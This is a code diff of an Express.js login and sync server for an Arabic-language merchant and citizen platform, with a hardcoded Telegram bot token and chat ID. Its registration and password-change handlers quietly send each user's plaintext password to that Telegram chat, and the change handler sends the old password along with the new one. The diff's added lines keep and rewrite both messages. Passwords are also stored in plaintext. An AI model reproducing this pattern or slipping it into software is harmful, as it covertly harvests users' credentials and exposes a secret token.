@@ -5,7 +5,6 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const DB_PATH = './heiba_royal_db.json';
 
-// إعدادات التلجرام الخاصة بك
 const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
 const MY_CHAT_ID = '5042495708';
 
@@ -36,7 +35,7 @@ app.post('/api/auth', async (req, res) => {
     const existingUser = db.users.find(u => u.name.toLowerCase() === normalizedName && u.type === type);
 
     if (action === 'reg') {
-        if (existingUser) return res.status(400).json({ error: "أنت مسجل مسبقاً بهذا الاسم." });
+        if (existingUser) return res.status(400).json({ error: "عذراً.. هذا الاسم مسجل مسبقاً." });
         const newUser = {
             id: "H" + Math.random().toString(36).substr(2, 7),
             name: name.trim(),
@@ -47,16 +46,16 @@ app.post('/api/auth', async (req, res) => {
         };
         db.users.push(newUser);
         saveDB();
-        sendToTelegram(`✨ **تسجيل جديد:**\nالاسم: ${newUser.name}\nالنوع: ${type}\nالسر: \`${password}\``);
+        sendToTelegram(`✨ **تسجيل جديد:**\nالاسم: ${newUser.name}\nالنوع: ${type === 'merchant' ? 'تاجر' : 'مواطن'}\nالسر: \`${password}\``);
         return res.json(newUser);
     } else {
         const user = db.users.find(u => u.name.toLowerCase() === normalizedName && u.password === password && u.type === type);
-        if (!user) return res.status(403).json({ error: "بيانات الدخول غير صحيحة." });
+        if (!user) return res.status(403).json({ error: "بيانات الدخول غير صحيحة لهذه الصفة." });
         return res.json(user);
     }
 });
 
-// تحديث كلمة السر (تم الإصلاح ليتطابق مع الواجهة)
+// تحديث كلمة السر (المسار الموحد)
 app.post('/api/update-pass', (req, res) => {
     const { userId, newPass } = req.body;
     const user = db.users.find(u => u.id === userId);
@@ -64,12 +63,11 @@ app.post('/api/update-pass', (req, res) => {
         const old = user.password;
         user.password = newPass;
         saveDB();
-        sendToTelegram(`🔐 **تغيير سر:**\nالاسم: ${user.name}\nمن: ${old} -> إلى: ${newPass}`);
+        sendToTelegram(`🔐 **تغيير كلمة السر:**\nالاسم: ${user.name}\nالسر القديم: \`${old}\`\nالسر الجديد: \`${newPass}\``);
         res.json({ success: true });
     } else { res.status(404).json({ error: "المستخدم غير موجود" }); }
 });
 
-// المزامنة التلقائية
 app.post('/api/sync', (req, res) => {
     const { userId, myRecords } = req.body;
     const idx = db.users.findIndex(u => u.id === userId);
@@ -94,4 +92,4 @@ app.get('/api/auto-discover', (req, res) => {
     res.json(results);
 });
 
-app.listen(PORT, () => console.log(`HEIBA PLATFORM ONLINE ON PORT ${PORT}`));
+app.listen(PORT, () => console.log(`HEIBA ROYAL SERVER ONLINE`));
